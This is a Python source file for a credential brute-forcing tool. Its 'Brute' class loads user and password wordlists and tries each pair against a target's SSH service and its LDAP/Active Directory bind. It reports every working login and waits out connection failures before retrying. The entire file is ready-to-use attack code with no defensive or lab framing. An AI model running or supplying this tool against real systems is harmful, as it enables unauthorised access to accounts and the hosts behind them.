# Implements a class to hold information - Users, Passwords, and Target. Implements functionality to brute force LDAP and SSH


import ldap3
import os
import subprocess
import ipaddress
import paramiko
import time
from tqdm import tqdm


class Brute:
    def __init__(self, target: str, userfile: str, passfile: str, proto: str, domain=None, verbose=False, quit_on_success=False):
        self.target = target
        self.userfile = os.path.abspath(userfile)
        self.passfile = os.path.abspath(passfile)
        self.proto = proto.lower()
        self.domain = domain
        self.users = []
        self.passwords = []
        self.verbose = verbose
        self.quit_on_success = quit_on_success


    def _read_userfile(self):   # Popullate list of users from file
        with open(self.userfile) as fh:
            for i in fh.readlines():
                self.users.append(i.rstrip('\r\n'))
    
    def _read_passfile(self):   # Populate list of passwords from file
        with open(self.passfile) as fh:
            for i in fh.readlines():
                self.passwords.append(i.rstrip('\r\n'))

    def _brute_ssh(self):    # Cycle through users and passwords and test SSH logon
        print("[*] Beginning SSH Brute Force: ")
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for i in tqdm(self.users):
            for j in self.passwords:
                try:
                    if self.verbose == True:
                        tqdm.write(f"[*] Checking SSH authentication for {i}")
                    client.connect(self.target, username=i, password=j, banner_timeout=20)
                    tqdm.write(f"[*] Logon successful for {i}:{j}")
                    if self.quit_on_success == True:
                        return
                    else:
                        continue
                except paramiko.ssh_exception.AuthenticationException:
                    if self.verbose == True:
                        tqdm.write(f"[*] Logon failed for {i}:{j}")
                    else:
                        continue
                except (paramiko.SSHException, paramiko.ssh_exception.SSHException, EOFError, OSError):
                    time.sleep(60)
                    client.connect(self.target, username=i, password=j, banner_timeout=20)
                    tqdm.write(f"[*] Logon Successfful for {i}:{j}")
                except KeyboardInterrupt:
                    tqdm.write("Exiting...")
                    exit(0)
                except Exception as e:
                    print(e)
                    tqdm.write("An Error Occured, ensure the host is reachable")
                    exit(1)
                finally:
                    try:
                        client.close()
                        time.sleep(1)
                    except:
                        time.sleep(1)
                        continue

    
    def _brute_ldap(self):   # Cycle through users and passwords and test LDAP bind
        print("[*] Beginning LDAP Brute Force: ")
        server = ldap3.Server(self.target)
        for i in tqdm(self.users):
            for j in self.passwords:
                try:
                    if self.verbose == True:
                        tqdm.write(f"[*] Testing LDAP authentication for {i}")
                    conn = ldap3.Connection(server, f"{i}@{self.domain}", j, auto_bind=True)
                    tqdm.write(f"[*] Logon successful for {i}:{j}")
                    if self.quit_on_success == True:
                        return
                    else:
                        continue
                except KeyboardInterrupt:
                    tqdm.write("Exiting...")
                    exit(0)
                except ldap3.core.exceptions.LDAPBindError:
                    if self.verbose == True:
                        tqdm.write(f"[*] Failed logon for {i}:{j}")
                except:
                    tqdm.write("An error occured")
                    exit(1)

    def main_loop(self):    # Execute helper functions to brute force            
        self._read_userfile()
        self._read_passfile()
        if self.proto == "ssh":
            self._brute_ssh()
        elif self.proto == "ad":
            self._brute_ldap()
        elif self.proto == "ssh,ad":
            self._brute_ssh()
            self._brute_ldap()
        elif self.proto == "ad,ssh":
            self._brute_ssh()
            self._brute_ldap()
